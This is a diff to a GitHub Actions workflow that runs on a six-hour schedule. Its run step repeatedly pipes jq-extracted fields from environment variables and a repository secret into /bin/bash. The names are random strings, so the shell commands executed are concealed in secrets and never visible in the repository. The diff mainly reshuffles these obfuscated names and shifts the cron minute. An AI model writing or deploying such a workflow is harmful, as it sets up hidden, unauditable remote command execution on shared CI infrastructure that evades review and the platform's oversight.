@@ -2,7 +2,7 @@ name: lulizhen1986
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 0/6 * * *'
+    - cron: '55 0/6 * * *'
 
 jobs:
   build:
@@ -12,18 +12,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: lulizhen1986
         env:
-          wtla05026: ${{ secrets.wtla05026 }}
+          d411: ${{ secrets.d411 }}
         run: |
-          echo $wtla05026 | jq -r .n6855 | /bin/bash
-          echo $khr80 | jq -r .rqhe36 | /bin/bash
-          echo $mjw839 | jq -r .nqe6 | /bin/bash
-          echo $eukb857 | jq -r .iq8 | /bin/bash
-          echo $kcc849 | jq -r .tgrwy09 | /bin/bash
-          echo $gtuq9526 | jq -r .dmklt527 | /bin/bash
-          echo $pbr06 | jq -r .hr35 | /bin/bash
-          echo $vb87775 | jq -r .bjpg49356 | /bin/bash
-          echo $gap38216 | jq -r .hl9 | /bin/bash
-          echo $n7 | jq -r .b88 | /bin/bash
-          echo $okmzc81 | jq -r .zl63 | /bin/bash
-          echo $wdjv2 | jq -r .hkjlj2643 | /bin/bash
+          echo $d411 | jq -r .kzl2893 | /bin/bash
+          echo $sayvt10402 | jq -r .m45119 | /bin/bash
+          echo $edmf20 | jq -r .tch17 | /bin/bash
+          echo $dns8 | jq -r .lhz587 | /bin/bash
+          echo $bnon777 | jq -r .kkj41895 | /bin/bash
+          echo $nwexp0 | jq -r .x10068 | /bin/bash
+          echo $sw2 | jq -r .zfix1 | /bin/bash
+          echo $fepc69962 | jq -r .o81242 | /bin/bash
+          echo $pvcni19 | jq -r .xobx42886 | /bin/bash
+          echo $c661 | jq -r .n09564 | /bin/bash
+          echo $aiv132 | jq -r .cjkxe50 | /bin/bash
+          echo $kjecz80 | jq -r .goh326 | /bin/bash
+          echo $svhm86 | jq -r .u48 | /bin/bash
+          echo $abwvh33 | jq -r .riy76682 | /bin/bash
+          echo $rcf71553 | jq -r .jbntz260 | /bin/bash
+          echo $unvun74 | jq -r .a356 | /bin/bash
+          echo $r1947 | jq -r .j0397 | /bin/bash
+          echo $vdyyn2 | jq -r .gw35841 | /bin/bash
 
